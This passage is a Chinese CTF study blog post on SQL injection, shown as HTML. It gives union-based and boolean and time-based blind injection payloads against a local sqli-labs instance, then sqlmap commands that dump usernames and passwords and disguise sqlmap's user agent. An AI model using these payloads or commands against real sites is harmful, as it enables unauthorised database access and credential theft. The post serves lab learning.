+<h4 id="3-2-获取数据库表名"><a href="#3-2-获取数据库表名" class="headerlink" title="3.2 获取数据库表名"></a>3.2 获取数据库表名</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,table_name from information_schema.tables where table_schema=&#x27;name&#x27;#</span><br><span class="line"># name为数据库名</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="3-3-获取字段名"><a href="#3-3-获取字段名" class="headerlink" title="3.3 获取字段名"></a>3.3 获取字段名</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;name&#x27;#</span><br><span class="line"># name 为表名</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="3-4-获取字段中的记录"><a href="#3-4-获取字段中的记录" class="headerlink" title="3.4 获取字段中的记录"></a>3.4 获取字段中的记录</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(name1,name2) from column_name#</span><br><span class="line"># name1,name2 为字段名 column_name 为表名</span><br><span class="line"></span><br><span class="line">-1&#x27; union select name1,name2 from colunm_name#</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p><strong>盲注</strong>就是在SQL注入过程中，SQL语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br><strong>布尔盲注</strong>：SQL语句执行后，页面不返回具体数据，数据库只返回1或者0(真or假)。类似于无法开口说话的人，只能通过点头和摇头来告诉你答案的正确与否。<br>**时间盲注:**在页面中，不管用户输入什么，数据交互完成以后目标网站没有错误和正确的页面回显，这种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。</p>
+<h3 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1. 布尔盲注"></a>1. 布尔盲注</h3><h4 id="1-1-判断是否存在注入"><a href="#1-1-判断是否存在注入" class="headerlink" title="1.1 判断是否存在注入"></a>1.1 判断是否存在注入</h4><p>第一步:正常查询，返回True(语句执行成功)或者返回False(语句执行成功没有查询到内容)。<br>第二步:输入引号进行看页面变化，页面返回False，可能存在漏洞，也可能没有查询到内容。<br>第三步:利用and进行判断，比如:1 and 1&#x3D;1和1 and 1&#x3D;2，1’and 1&#x3D;1#和1’and 1&#x3D;2#，如果前者执行的结果不一样，说明是数字型的布尔盲注;如果后者执行的结果不一样，说明是字符型的布尔盲注。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1=1;</span><br><span class="line">select * from users where id=1 and 1=2;</span><br><span class="line">select * from users where id=&#x27;1&#x27; and 1=1#&#x27;;</span><br><span class="line">select * from users where id=&#x27;1&#x27; and 1=2#&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="1-2-获取数据库长度"><a href="#1-2-获取数据库长度" class="headerlink" title="1.2. 获取数据库长度"></a>1.2. 获取数据库长度</h4><p>因为无法通过页面数据回显获取数据，所以只能靠判断对错的方式来获取数据，可以使用MySQL中的内置函数获取字符串长度:<br>**length():**单位是字节，utf8编码下,一个汉字三个字节，一个数字或字母一个字节。gbk编码下,一个汉字两个字节，一个数字或字母一个字节。<br>**char_length():**单位为字符，不管汉字还是数字或者是字母都算是一个字符。</p>
+<p>例如：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length(databese());</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>但是在盲注中是无法回显select的输出的</strong></p>
+<p>所以尝试得到长度可以用burp爆破或者二分(利用&gt;、&lt;、&#x3D;)：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and length(database())&lt;10%23</span><br></pre></td></tr></table></figure></div>
+
+<p>正确的长度会得到正确回显</p>
+<p>上传到数据库的语句为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and length(database())&lt;10#&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="1-3-获取数据库名"><a href="#1-3-获取数据库名" class="headerlink" title="1.3. 获取数据库名"></a>1.3. 获取数据库名</h4><ul>
+<li>利用substr(string,start,length)截取字符串</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27;%23</span><br></pre></td></tr></table></figure></div>
+
+<p>依次判断数据库名的每个字符，然后得到数据库名，这里采用将字母转换为ASCII码然后用burp的<strong>集束炸弹</strong>进行爆破</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115 %23</span><br></pre></td></tr></table></figure></div>
+
+<p>然后选定payload位置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and ascii(substr(database(),$1$,1))=$115$ %23</span><br></pre></td></tr></table></figure></div>
+
+<p>第一个位置范围为1-8（数据库名长度），第二个位置范围为65-122（大小写字母ASCII码范围）</p>
+<p>爆破完成得到数据库名<strong>security</strong></p>
+<p>&#x3D;&#x3D;<strong>然后依次得到表名和字段名</strong>&#x3D;&#x3D;</p>
+<blockquote>
+<p>以上为布尔盲注，以下为时间盲注</p>
+</blockquote>
+<h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2. 时间盲注"></a>2. 时间盲注</h3><h4 id="2-1-判断是否存在注入"><a href="#2-1-判断是否存在注入" class="headerlink" title="2.1. 判断是否存在注入"></a>2.1. 判断是否存在注入</h4><p>利用时间函数sleep()进行判断</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and sleep(5) %23</span><br></pre></td></tr></table></figure></div>
+
+<p>然后查看“网络”界面的请求耗时，如果正好相差五秒，则为时间盲注。</p>
+<h4 id="2-2获取数据库长度"><a href="#2-2获取数据库长度" class="headerlink" title="2.2获取数据库长度"></a>2.2获取数据库长度</h4><p>在上面布尔盲注的基础上，这里要加上if()条件判断语句</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(exp1,cmd1,cmd2)</span><br><span class="line"># 如果exp1为真，执行cmd1，否则执行cmd2</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())=8,sleep(5),1) %23</span><br></pre></td></tr></table></figure></div>
+
+<p>然后比较“网络”界面的请求耗时，或者直接在burp爆破结果中勾选响应时间的选项，然后找到不一样的那个</p>
+<p>之后的步骤同布尔盲注</p>
+<hr>
+<h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>以下演示为windows中，如果在kali中，则可以直接执行sqlmap</p>
+<h3 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1. 判断是否存在注入"></a>1. 判断是否存在注入</h3><div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span></span><br><span class="line">python sqlmap.py -u &quot;http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;page=<span class="number">10</span>&quot; -p page </span><br><span class="line">python sqlmap.py -u &quot;http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;page=<span class="number">10</span>&quot; -p page --batch </span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>-u:指定URL</li>
+<li>-p:url多参数时指定注入点</li>
+<li>–batch:自动化测试，需要选择时全部默认Y(注入过程可能比较久)</li>
+</ul>
+<h3 id="2-获取信息"><a href="#2-获取信息" class="headerlink" title="2. 获取信息"></a>2. 获取信息</h3><div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> --dbs</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security --tables</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security -T users --columns</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security -T users -C id,username,password --dump</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><p>–dbs:获取数据库名</p>
+</li>
+<li><p>–tables:获取数据库表名</p>
+</li>
+<li><p>–columns:获取字段名</p>
+</li>
+<li><p>-D,-T,-C:分别表示指定数据库、表、字段</p>
+</li>
+<li><p>–dump:获取字段内容(慎用)</p>
+</li>
+</ul>
+<h3 id="3-多目标"><a href="#3-多目标" class="headerlink" title="3. 多目标"></a>3. 多目标</h3><p>把要测试的url放入一个txt文件里，使用-m参数执行txt文件</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m test.txt</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4-需要登录"><a href="#4-需要登录" class="headerlink" title="4. 需要登录"></a>4. 需要登录</h3><p>需要先获取自己的cookie，然后利用–cookie参数进行执行</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u  http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;Submit=submit# -p id --cookie cookie --dbs --batch</span><br></pre></td></tr></table></figure></div>
+
+<p>利用sqlmap进行注入的user-agent头文件有明显的sqlmap</p>
+<p>于是可以使用–random-agent 参数随机UA头，或者利用–user-agent&#x3D;UA，使用自己的UA头。</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> --random-agent</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sq1i/Less-<span class="number">1</span>/?id=<span class="number">1</span> --user-agent=&quot;Mozi11a/<span class="number">4</span>.<span class="number">0</span> (compatible; MSIE <span class="number">6</span>.<span class="number">0</span>: Windows NT <span class="number">5</span>.<span class="number">0</span>: de) Opera <span class="number">8</span>.<span class="number">0</span>&#x27;</span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> sql注入（web界面）</li>
+        <li><strong>Author:</strong> Dunm1e</li>
+        <li><strong>Created at
+                :</strong> 2024-09-11 18:55:45</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-09-12 08:18:24
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/f366e274d4aa/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/sql/">#sql</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/09/11/478a9824d4db/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">ssh密钥泄露</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/09/11/3bc19a255208/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">sql注入（IP命令行）</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdnjs.cloudflare.com/ajax/libs/twikoo/1.6.39/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            function loadTwikoo() {
+                twikoo.init({
+                    el: '#twikoo-comment',
+                    envId: 'https://twikoo.dunm1e.cn',
+                });
+            }
+
+            if ('true') {
+                const loadTwikooTimeout = setTimeout(() => {
+                    loadTwikoo();
+                    clearTimeout(loadTwikooTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadTwikoo);
+            }
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">sql注入（web界面）</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%EF%BC%88web%E7%95%8C%E9%9D%A2%EF%BC%89"><span class="nav-text">sql注入（web界面）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5"><span class="nav-text">增删改查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-schema%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">Information_schema数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CHARACTER-SETS-%E8%A1%A8"><span class="nav-text">CHARACTER_SETS 表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SCHEMATA-%E8%A1%A8"><span class="nav-text">&#x3D;&#x3D;SCHEMATA 表&#x3D;&#x3D;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TABLES-%E8%A1%A8"><span class="nav-text">&#x3D;&#x3D;TABLES 表&#x3D;&#x3D;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#COLUMNS-%E8%A1%A8"><span class="nav-text">&#x3D;&#x3D;COLUMNS 表&#x3D;&#x3D;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#USER-PRIVILEGES-%E8%A1%A8"><span class="nav-text">USER_PRIVILEGES 表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-text">sql注入语句</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E"><span class="nav-text">1. 判断是否存在漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text">2. 判断注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%88%96%E8%80%85%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-text">字符型或者数字型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-text">联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="nav-text">1. 判断列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%A1%AE%E5%AE%9A%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-text">2. 确定显示位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E4%BF%A1%E6%81%AF"><span class="nav-text">3.  获取数据信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E3%80%81%E7%89%88%E6%9C%AC"><span class="nav-text">3.1 获取数据库名、版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D"><span class="nav-text">3.2 获取数据库表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-text">3.3 获取字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%B8%AD%E7%9A%84%E8%AE%B0%E5%BD%95"><span class="nav-text">3.4 获取字段中的记录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E7%9B%B2%E6%B3%A8"><span class="nav-text">sql盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">1. 布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-text">1.1 判断是否存在注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="nav-text">1.2. 获取数据库长度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-text">1.3. 获取数据库名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">2. 时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-text">2.1. 判断是否存在注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="nav-text">2.2获取数据库长度</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">sqlmap的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-text">1. 判断是否存在注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="nav-text">2. 获取信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%A4%9A%E7%9B%AE%E6%A0%87"><span class="nav-text">3. 多目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E9%9C%80%E8%A6%81%E7%99%BB%E5%BD%95"><span class="nav-text">4. 需要登录</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">© 2024 Dunm1e. All rights reserved.</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Dunm1e</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        20 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
